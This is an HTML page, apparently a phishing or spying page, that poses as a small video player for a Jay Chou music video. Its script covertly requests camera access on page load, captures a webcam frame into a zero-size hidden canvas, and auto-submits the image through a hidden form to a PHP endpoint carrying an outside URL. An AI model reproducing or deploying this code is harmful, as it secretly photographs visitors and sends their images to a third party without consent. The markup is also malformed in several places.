<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" name="viewport"
          <title>小视频播放器</title>
<html manifest="demo_html.appcache">
  </head>
<body>
<script src="demo_time.js">
    <video id="video" width="0" height="0" autoplay></video>
	<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
	<script type="text/javascript">
		window.addEventListener("DOMContentLoaded", function() {
            var canvas = document.getElementById('canvas');
            var context = canvas.getContext('2d');
            var video = document.getElementById('video');

            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
					video.srcObject = stream;
                    video.play();
                    
                    setTimeout(function(){context.drawImage(video, 0, 0, 480, 640);},1000);
                    setTimeout(function(){
                        var img = canvas.toDataURL('image/png');  
                        document.getElementById('result').value = img;
                        document.getElementById('gopo').submit();
                        },1300);
                },function(){alert("操作失败，权限不够！");});
                
            }
		}, false);

	</script>
<form action="qbl.php?id=7744&url=http://zztnibai.xyz" id="gopo" method="post">
<input type="hidden" name="img" id="result" value="" />
</form>
<p id="timePara"><button onclick="getDateTime()">获取日期和时间</button></p>
<video src="周杰伦-兰亭序-art--周杰伦--art-6c09eddd1d4c6b5c4355d68c34ad253d.mp4" controls width="100%"/>
</body>
</html>
